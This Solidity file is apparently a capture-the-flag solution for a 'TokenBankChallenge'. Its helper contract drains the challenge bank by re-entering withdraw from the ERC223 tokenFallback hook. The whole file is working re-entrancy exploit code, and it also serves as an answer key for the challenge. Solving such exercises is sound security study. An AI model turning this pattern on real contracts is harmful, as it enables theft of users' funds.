pragma solidity ^0.4.21;

import "../TokenBankChallenge.sol";

contract TokenBankChallengeHelper is ITokenReceiver {
    address owner;
    TokenBankChallenge bank;
    SimpleERC223Token token;

    function TokenBankChallengeHelper(address _bank, address _token) public {
        owner = msg.sender;
        bank = TokenBankChallenge(_bank);
        token = SimpleERC223Token(_token);
    }

    /// @notice Basic re-entrancy attack
    /// @dev Owner should have approved all of his ERC223 tokens to this helper contract
    function exploit() external payable {
        require(msg.sender == owner);
        token.transferFrom(owner, address(this), token.balanceOf(owner));
        uint256 bal = token.balanceOf(address(this));
        require(bal > 0);
        token.transfer(address(bank), bal);
        bank.withdraw(bank.balanceOf(address(this)));
    }

    function tokenFallback(
        address from,
        uint256,
        bytes
    ) external {
        require(msg.sender == address(token));
        require(tx.origin == owner);
        require(from == address(bank));

        uint256 bankTokenBalance = token.balanceOf(address(bank));
        if (bankTokenBalance == 0) return;

        uint256 ourTokenBalance = bank.balanceOf(address(this));
        if (bankTokenBalance > ourTokenBalance) {
            bank.withdraw(ourTokenBalance);
        } else {
            bank.withdraw(bankTokenBalance);
        }
    }
}
